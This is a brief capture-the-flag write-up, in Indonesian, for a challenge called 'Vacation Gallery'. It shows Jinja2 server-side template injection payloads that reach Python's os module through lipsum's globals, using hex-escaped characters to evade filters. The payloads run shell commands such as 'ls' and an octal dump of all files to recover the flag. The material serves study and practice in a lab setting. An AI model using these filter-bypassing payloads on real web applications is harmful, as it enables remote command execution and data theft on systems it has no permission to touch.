# Writeup Vacation Gallery
Recon:
```
{%print(self._TemplateReference__context)%}
```
Terdapat fungsi lipsum yang bisa digunakan \_\_globals\_\_nya untuk mengakses modul `os`.

```
{%print(lipsum|attr("_\x5fglobals__")).os.popen("ls").read()%}
```
Terdapat file yang namanya terlalu panjang, sehingga harus menggunakan wildcard. Kita bisa menggunakan command `od` untuk melakukan octal dump.

```
{%print(lipsum|attr("_\x5fglobals__")).os.popen("od\x20*").read()%}
```
Setelah itu, kita mendapatkan octal dump dari semua file di cwd (out.txt). Kita dapat mengambil semuanya kecuali byte oktal terakhir (karena itu merupakan panjang dari octal dumpnya), dan mengonversikannya ke bytes, sebagaimana pada solver.py.
